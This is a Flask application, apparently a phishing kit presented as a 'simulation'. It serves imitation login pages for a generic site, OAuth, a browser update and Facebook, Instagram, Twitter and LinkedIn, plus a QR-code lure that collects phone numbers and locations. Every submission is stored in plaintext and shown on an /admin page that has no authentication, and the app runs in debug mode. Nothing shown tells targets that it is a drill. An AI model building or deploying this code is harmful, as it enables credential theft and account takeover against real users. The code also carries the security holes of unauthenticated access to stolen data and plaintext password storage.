from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import qrcode
import os

app = Flask(__name__)

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phishing.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database table
class CredentialEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    page = db.Column(db.String(200))
    email = db.Column(db.String(200))
    password = db.Column(db.String(200))
    phone = db.Column(db.String(50))
    location = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

@app.before_request
def create_tables():
    db.create_all()

# Home Page
@app.route("/")
def index():
    return render_template("index.html")

# ---------------------------
# LOGIN SIMULATION
# ---------------------------
@app.route("/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # Store dummy credentials
        event = CredentialEvent(page="login_page", email=email, password=password)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("login.html")


# ---------------------------
# OAUTH SIMULATION
# ---------------------------
@app.route("/oauth", methods=["GET","POST"])
def oauth():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="oauth_page", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("oauth.html")


# ---------------------------
# BROWSER UPDATE SIMULATION
# ---------------------------
@app.route("/browser-update", methods=["GET","POST"])
def browser_update():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="browser_update", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("browser_update.html")


# ---------------------------
# SOCIAL MEDIA SIMULATION
# ---------------------------
@app.route("/social", methods=["GET","POST"])
def social():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="social_media", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("social.html")



# ---------------------------
# QR PHISHING SIMULATION
# ---------------------------
@app.route("/qr")
def qr_page():
    qr_path = "static/qr.png"

    # Get Base URL from environment or default to localhost
    base_url = os.environ.get("BASE_URL", "http://127.0.0.1:5000")

    if not os.path.exists(qr_path):
        # Update point to mobile-verify
        img = qrcode.make(f"{base_url}/mobile-verify")
        img.save(qr_path)

    return render_template("qr.html", qr_image=qr_path)

# ---------------------------
# MOBILE VERIFICATION (Please provide location & phone)
# ---------------------------
@app.route("/mobile-verify", methods=["GET", "POST"])
def mobile_verify():
    if request.method == "POST":
        data = request.form
        
        # Capture form or json
        phone = data.get("phone")
        location = data.get("location")
        
        event = CredentialEvent(
            page="mobile_verify",
            phone=phone,
            location=location
        )
        db.session.add(event)
        db.session.commit()
        
        return redirect("/thankyou")
        
    return render_template("mobile_verify.html")

@app.route("/select_platform")
def select_platform():
    return render_template("select_platform.html")

@app.route("/login/<platform>", methods=["GET"])
def platform_login(platform):
    templates = {
        "facebook": "facebook_login.html",
        "instagram": "instagram_login.html",
        "twitter": "twitter_login.html",
        "linkedin": "linkedin_login.html"
    }

    if platform not in templates:
        return "Platform not supported", 404

    return render_template(templates[platform], platform=platform)

# ---------------------------
# THANK YOU PAGE
# ---------------------------
@app.route("/thankyou")
def thankyou():
    return render_template("thankyou.html")


# ---------------------------
# ADMIN PANEL
# ---------------------------
@app.route("/admin")
def admin():
    all_data = CredentialEvent.query.all()
    mobile_data = [d for d in all_data if d.page == 'mobile_verify']
    other_data = [d for d in all_data if d.page != 'mobile_verify']
    return render_template("admin.html", mobile_data=mobile_data, other_data=other_data)


@app.route("/platform_submit", methods=["POST"])
def platform_submit():
    data = request.get_json()

    email = data.get("email")
    password = data.get("password")
    platform = data.get("platform")

    event = CredentialEvent(
        page=platform,
        email=email,
        password=password
    )

    db.session.add(event)
    db.session.commit()

    return {"status": "stored"}

if __name__ == "__main__":
    app.run(debug=True, port=5000)
